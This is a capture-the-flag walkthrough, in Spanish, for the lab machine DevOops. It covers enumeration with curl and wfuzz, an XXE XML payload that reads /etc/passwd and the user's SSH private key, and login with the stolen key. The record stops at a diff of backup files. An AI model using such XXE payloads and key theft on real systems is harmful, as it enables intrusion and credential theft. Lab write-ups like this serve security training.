# 10.10.10.91 - DevOops
-----------------------

PUertos abiertos 22(ssh), 5000

```console
└─$ curl -s http://10.10.10.91:5000
Under construction!
This is feed.py, which will become the MVP for Blogfeeder application.
TODO: replace this with the proper feed from the dev.solita.fi backend.
[/feed]

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 'http://10.10.10.91:5000/FUZZ/'
000000347:   200        0 L      39 W       347 Ch      "upload"                                             
000000112:   200        1815 L   24122 W    517022 Ch   "feed"
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 'http://10.10.10.91:5000/FUZZ.php'
# Nada
└─$ wfuzz -c --hw=31 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.10.10.10.91:5000" -u http://10.10.10.91:5000/ -t 100
# Tampoco
```

**/feed** -> nos muestra la misma foto que salia en el puerto 5000

En **/uploads** nos piden un xml pero da "Internal server error"

```xml
<?xml version="1.0" encoding="UTF-8"?>
<elements>
    <Author>William Gibson</Author>
    <Subject>Cyberpunk</Subject>
    <Content>Neuromante</Content>
</elements>
```
```
PROCESSED BLOGPOST: Author: William Gibson Subject: Cyberpunk Content: Neuromante 
URL for later reference: /uploads/test.xml File path: /home/roosa/deploy/src
```
Esto nos leakea el lugar donde se sube y una ruta/usuario del sistema "roosa"

Si subimos un XML "muy especial" (inyeccion XXE)
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<elements>
    <Author>&xxe;</Author>
    <Subject>Cyberpunk</Subject>
    <Content>Neuromante</Content>
</elements>
```
Conclusión: Usarios -> root git y roosa

Como sabemos que existe el usuario roosa, podemos pedir su llave ```/home/roosa/.ssh/id_rsa```
Y 

```console
└─$ ssh -i id_rsa roosa@10.10.10.91
```

```
roosa@devoops:~$ cat run-blogfeed.sh
#/bin/bash

# TODO: replace with better script and run as blogfeed user which is restricted

cd /home/roosa/work/blogfeed/src
../run-gunicorn.sh
```


- Archivos que llaman la atencion: /home/roosa/deploy/src/app.py~ /home/roosa/service.sh 
La "~" significa backup, con diff vemos las diferencias...
```console
roosa@devoops:/tmp$ diff <(cat /home/roosa/deploy/src/app.py~) <(cat /home/roosa/deploy/src/app.py)
<   run_gunicorn_app("0.0.0.0", 5000, True, )
>   run_gunicorn_app("0.0.0.0", 5000, True, None)
```






